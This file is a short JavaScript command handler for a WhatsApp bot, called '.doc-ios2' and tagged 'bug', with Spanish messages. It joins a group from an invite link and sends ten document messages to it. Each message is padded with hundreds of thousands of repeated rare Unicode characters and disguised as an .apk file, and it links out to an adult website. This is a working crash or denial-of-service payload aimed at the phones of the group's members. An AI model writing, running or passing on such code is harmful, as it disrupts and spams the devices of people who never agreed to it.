let handler = async (m, { conn, text }) => { if (!text || !text.includes('chat.whatsapp.com')) { return m.reply('❌ Debes proporcionar el enlace del grupo.\nEjemplo: .doc-ios2 https://chat.whatsapp.com/XXXX'); }

const match = text.match(/chat.whatsapp.com/([0-9A-Za-z]+)/); if (!match) return m.reply('😿 Enlace inválido.');

const inviteCode = match[1]; let groupId;

try { groupId = await conn.groupAcceptInvite(inviteCode); } catch (e) { groupId = 120363${inviteCode}@g.us; }

const basura = '𑇃𑆵𑆴𑆾'.repeat(70000); const webios = basura + basura + basura; const fileName = '🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 ' + basura;

for (let i = 0; i < 10; i++) { try { await conn.sendMessage(groupId, { document: { url: 'https://files.catbox.moe/2dvudi.txt' }, fileName: fileName + '.apk', mimetype: 'application/vnd.android.package-archive', caption: '', headerType: 4, contextInfo: { externalAdReply: { showAdAttribution: true, title: webios + "ＵＮＫ ↯ ＢＯＴＺＩＮ", body: webios + "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛", thumbnailUrl: "https://exemplo.com/thumbnail.jpg", sourceUrl: "https://xnxx.com" } } }, { quoted: m }); } catch (err) { console.log(err); m.reply('❌ Error al enviar el documento.'); } }

await m.reply('📄 Documentos enviados al grupo correctamente.'); };

handler.command = ['doc-ios2']; handler.tags = ['bug', 'doc']; handler.help = ['doc-ios2 <enlace del grupo>']; export default handler;

